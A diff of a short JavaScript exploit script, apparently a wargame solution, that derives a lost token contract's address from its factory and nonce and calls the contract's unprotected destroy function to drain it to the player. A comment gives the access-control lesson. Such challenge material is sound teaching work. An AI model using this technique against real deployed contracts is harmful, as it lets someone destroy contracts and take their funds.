@@ -11,19 +11,17 @@ Always protect sensitive public functions with access control
 
 */
 
-import { ethers } from 'hardhat';
-import { getContractAddress } from '@ethersproject/address';
+const ethers = require('ethers');
+const { getContractAddress} = require('@ethersproject/address');
 
-const attack = async (factoryAddress) => {
+const attack = async (factoryAddress) => { 
 
   const tokenAddress = getContractAddress({
     from: factoryAddress,
-    nonce: 0
+    nonce: 1
   });
 
-  const Token = await ethers.getContractFactory("Token");
+  const tokenContract = new ethers.Contract(tokenAddress, abi, wallet);
 
-  Token.attach(tokenAddress);
-
-  await (await Token.destroy(player)).wait();
+  await (await tokenContract.destroy(player)).wait();
 }
